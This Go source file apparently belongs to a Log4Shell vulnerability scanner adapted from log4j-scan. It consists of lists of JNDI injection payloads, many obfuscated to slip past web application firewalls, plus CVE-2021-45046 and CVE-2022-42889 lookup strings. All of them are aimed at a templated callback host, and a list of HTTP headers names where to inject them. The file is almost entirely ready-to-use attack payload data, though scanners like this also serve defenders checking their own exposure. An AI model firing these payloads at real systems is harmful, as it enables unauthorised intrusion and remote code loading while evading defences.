package log4j

/**
   @author yhy
   @since 2023/5/15
   @desc https://github.com/fullhunt/log4j-scan/blob/master/log4j-scan.py#L53
**/

var waf_bypass_payloads = []string{
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
    "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
    "${jndi:rmi://{{callback_host}}/{{random}}}",
    "${jndi:rmi://{{callback_host}}}/",
    "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
    "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
    "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
    "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
    "${jndi:dns://{{callback_host}}/{{random}}}",
    "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
    "${jndi:dns://{{callback_host}}}",
    "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
    "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
    "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
    "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
    "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
    "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
    "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
    "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}",
}

var cve_2021_45046 = []string{
    "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", // Source: https://twitter.com/marcioalm/status/1471740771581652995,
    "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
    "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}",
}

var cve_2022_42889 = []string{
    "${url:UTF-8::https://{{callback_host}}/}",
    "${url:UTF-8::https://{{callback_host}}/{{random}}}",
    "${url:UTF-8::http://{{callback_host}}/}",
    "${url:UTF-8::http://{{callback_host}}/{{random}}}",
    "${dns:address|{{callback_host}}}",
}

var commonHeaders = []string{
    "Accept-Charset",
    "Accept-Datetime",
    "Accept-Encoding",
    "Accept-Language",
    "Cache-Control",
    "Cookie",
    "DNT",
    "Forwarded",
    "Forwarded-For",
    "Forwarded-For-Ip",
    "Forwarded-Proto",
    "From",
    "Max-Forwards",
    "Origin",
    "Pragma",
    "Referer",
    "TE",
    "True-Client-IP",
    "Upgrade",
    "Via",
    "Warning",
    "X-ATT-DeviceId",
    "X-Api-Version",
    "X-Att-Deviceid",
    "X-CSRFToken",
    "X-Correlation-ID",
    "X-Csrf-Token",
    "X-Do-Not-Track",
    "X-Foo",
    "X-Foo-Bar",
    "X-Forward-For",
    "X-Forward-Proto",
    "X-Forwarded",
    "X-Forwarded-By",
    "X-Forwarded-For",
    "X-Forwarded-For-Original",
    "X-Forwarded-Host",
    "X-Forwarded-Port",
    "X-Forwarded-Proto",
    "X-Forwarded-Protocol",
    "X-Forwarded-Scheme",
    "X-Forwarded-Server",
    "X-Forwarded-Ssl",
    "X-Forwarder-For",
    "X-Frame-Options",
    "X-From",
    "X-Geoip-Country",
    "X-HTTP-Method-Override",
    "X-Http-Destinationurl",
    "X-Http-Host-Override",
    "X-Http-Method",
    "X-Http-Method-Override",
    "X-Http-Path-Override",
    "X-Https",
    "X-Htx-Agent",
    "X-Hub-Signature",
    "X-If-Unmodified-Since",
    "X-Imbo-Test-Config",
    "X-Insight",
    "X-Ip",
    "X-Ip-Trail",
    "X-ProxyUser-Ip",
    "X-Request-ID",
    "X-Requested-With",
    "X-UIDH",
    "X-Wap-Profile",
    "X-XSRF-TOKEN",
}
